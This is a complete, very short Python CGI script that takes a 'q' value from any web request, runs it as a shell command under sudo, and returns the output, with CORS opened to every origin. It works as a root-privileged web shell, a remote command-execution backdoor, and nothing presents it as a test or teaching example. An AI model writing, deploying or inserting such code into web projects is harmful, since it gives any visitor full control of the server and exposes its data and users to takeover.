#!/usr/bin/python3
import cgi
import subprocess
print("Content-Type: text/html")
print("Access-Control-Allow-Origin: *")
print()


field = cgi.FieldStorage()
cmd = field.getvalue('q')

out = subprocess.getoutput(f"sudo {cmd}")
print(out)
